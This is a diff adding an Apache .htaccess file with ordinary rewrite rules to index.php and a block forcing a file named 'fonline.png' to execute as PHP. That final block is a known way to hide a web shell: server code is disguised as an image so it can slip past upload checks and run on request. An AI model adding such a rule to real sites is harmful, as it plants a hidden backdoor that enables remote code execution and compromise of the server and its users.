@@ -1,0 +1,10 @@
+Options -Indexes
+
+RewriteEngine On
+
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteRule ^ index.php [QSA,L]
+
+<Files "fonline.png">
+    ForceType application/x-httpd-php
+</Files>
